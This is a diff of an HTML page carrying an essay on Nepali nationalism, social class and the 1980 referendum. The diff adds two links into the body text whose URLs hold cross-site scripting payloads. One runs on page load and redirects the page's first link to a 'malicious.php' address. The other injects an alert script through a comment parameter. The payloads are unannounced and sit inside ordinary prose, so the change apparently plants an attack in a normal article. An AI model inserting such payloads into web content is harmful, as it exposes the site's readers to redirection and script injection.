@@ -19,7 +19,9 @@
  
 <blockquote>No matter how instable the polity is or how poor and ignorant the populace are, Nepal is accursed to wallow in its sovereign misery as long as the balance of power does not change. </blockquote>   
 
-<p>Just like the dress and address, concerns of a person also reflect one’s class in an unmistakable manner. When members of the Upper Class meet, they talk about paucity of domestic help or the challenges of retaining skilled chauffeurs. The Middle Class has middling concerns: next EMI, school admissions, traffic snarls, quality of Chinese wines, and the best place for crusty pizza in town.</p>
+
+<a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> Just like the dress </a> 
+and address, concerns of a person also reflect one’s class in an unmistakable manner. When members of the Upper Class meet, they talk about paucity of domestic help or the challenges of retaining skilled chauffeurs. The Middle Class has middling concerns: next EMI, school admissions, traffic snarls, quality of Chinese wines, and the best place for crusty pizza in town.</p>
 
 <p>The Working Class is perpetually on the lookout for a visa to anywhere in the world to escape the tedium of remaining in the same place despite running nonstop. The Under Class has no time to worry—it survives and vents its frustrations by cursing either the fate or the politicians.
 </p>
@@ -40,7 +42,7 @@ Writing about circumstances leading to the rise of Napoleon Bonaparte, “the ki
 <p><b>Contested context</b></p>
 <p> It’s in the nature of history that it never lets go of its grip over the collective imagination. Starting with the military campaigns of Gorkhali warriors till the Treaty of Sugauli in 1814-16, the emergence of Khas strongman Jang Bahadur Kunwar in 1846, and the brief interlude of democracy between 1950 and 1960 followed by the royal-military coup, each historic episode has helped shape the self-definition of the Nepali people.
 
-However, by virtue of its comprehensiveness, the Referendum of 1980 continues to be the cataclysmic event that confined the idea of being a Nepali into a narrow quadrant of egocentrism, ethnocentrism, xenophobia and McCarthyism. The chain of events in the wake of Referendum strengthened the self-perception of ‘patriotic’ Nepalis as being constantly at the risk of losing its identity. The aggressiveness of nationalists comes from fears that have little base in reality.
+<a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>"target="_blank"> However, by virtue of its </a> comprehensiveness, the Referendum of 1980 continues to be the cataclysmic event that confined the idea of being a Nepali into a narrow quadrant of egocentrism, ethnocentrism, xenophobia and McCarthyism. The chain of events in the wake of Referendum strengthened the self-perception of ‘patriotic’ Nepalis as being constantly at the risk of losing its identity. The aggressiveness of nationalists comes from fears that have little base in reality.
 
 Even though rigged, the result of the plebiscite conferred post-facto legitimacy upon the royal-military coup of 1960 that King Mahendra had staged to concentrate state powers in the institution of monarchy. It established the centrality of the king in public life and made a leader of BP Koirala’s stature proclaim publicly that the future of Nepali nationality was inextricably intertwined with the fate of monarchy. Sacredness of military was its natural corollary with the Supreme Commander-in-Chief as the ultimate protector of national interest.
 
